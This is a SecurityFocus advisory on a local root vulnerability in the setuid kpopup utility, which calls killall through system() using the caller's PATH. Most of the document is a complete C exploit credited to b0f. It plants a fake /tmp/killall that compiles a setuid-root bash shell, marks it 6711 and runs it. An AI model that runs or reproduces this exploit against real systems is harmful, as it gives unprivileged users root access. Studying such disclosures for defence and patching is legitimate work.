source: http://www.securityfocus.com/bid/8915/info

It has been alleged that it is possible for local attackers to gain root privileges through kpopup, which is is installed setuid root by default. According to the report, kpopup uses the system(3) C-library function insecurely to run other utilities on the system. In at least one instance, system(3) is called to invoke the binary killall(1) in a manner relying on the PATH environment variable. As the environment can be set by the unprivileged user when kpopup is executed, an arbitrary executable with the filename killall(1) can be executed. Many modern shells anticipate insecure use of this function by setuid/setgid processes and drop effective privileges if they do not match the real userid/gid of the process. It may be the case that kpopup first sets its real uid and gid to 0 before calling system, making this vulnerability exploitable. This has not been confirmed by Symantec. 

/*Local root exploit for kpopup
 *by b0f www.b0f.net
 */
#include <stdio.h>
int main()
{
setenv("PATH=/tmp:/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:\
/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin:");
FILE *fd;
fd = fopen("/tmp/killall", "w");{
fprintf(fd, "#!/bin/sh\n");
fprintf(fd, "cd /tmp\n");
fprintf(fd, "/bin/cat > shell.c << EOF\n");
fprintf(fd, "#include <stdio.h>\n");
fprintf(fd, "int main()\n");
fprintf(fd, "{\n");
fprintf(fd, "setuid(0);\n");
fprintf(fd, "setgid(0);\n");
fprintf(fd, "execl(\"/bin/bash\", \"-bash\", NULL);\n");
fprintf(fd, "return 0;\n");
fprintf(fd, "}\n");
fprintf(fd, "EOF\n");
fprintf(fd, "/usr/bin/gcc /tmp/shell.c -o /tmp/shell\n");
fprintf(fd, "/bin/chown root.root /tmp/shell\n");
fprintf(fd, "/bin/chmod 6711 /tmp/shell\n");
fprintf(fd, "echo NOW HERE IS YOUR ROOT SHELL\n");
fprintf(fd, "/tmp/shell\n");
fclose(fd);
system("chmod +x /tmp/killall");
system("/usr/local/kde/bin/kpopup root shell");
return 0;
}
}